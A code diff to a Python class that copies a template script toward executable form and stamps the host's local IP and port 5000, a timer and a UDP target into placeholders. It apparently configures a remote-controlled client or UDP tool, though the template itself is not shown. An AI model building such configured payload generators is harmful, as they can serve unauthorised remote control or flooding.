@@ -1,6 +1,7 @@
 from pathlib import Path
 import shutil
 import os
+from classes.getIP import NetworkUtils
 
 class TransformToExe:
 
@@ -10,8 +11,9 @@ class TransformToExe:
         self.parent_dir = os.path.dirname(os.path.dirname
                                           (os.path.abspath(__file__)))
         self.source_path = Path(f'./storage/scripting/exec.py')
-        self.destination_path = Path(f'./storage/scripting/exec2.py')
+        self.destination_path = Path(f'./storage/scripting/esharexe22.py')
         self.message = None
+        self.ip = f'{NetworkUtils.get_local_ip()}:5000'
 
     def copy_file(self):
         try:
@@ -31,9 +33,13 @@ class TransformToExe:
         Data = filing.splitlines()
         i = 0
         for data in Data:#looping to get all lines
+
+            if 'the_ip' in data:
+                newline = data.replace("the_ip", self.ip)
+                Data[int(i)] = newline
             
             if 'the_timer' in data:
-                newline = data.replace('the_timer', timer)
+                newline = data.replace("the_timer", timer)
                 newline = newline.replace("the_udpip", udpip)
         
                 print(newline, i)
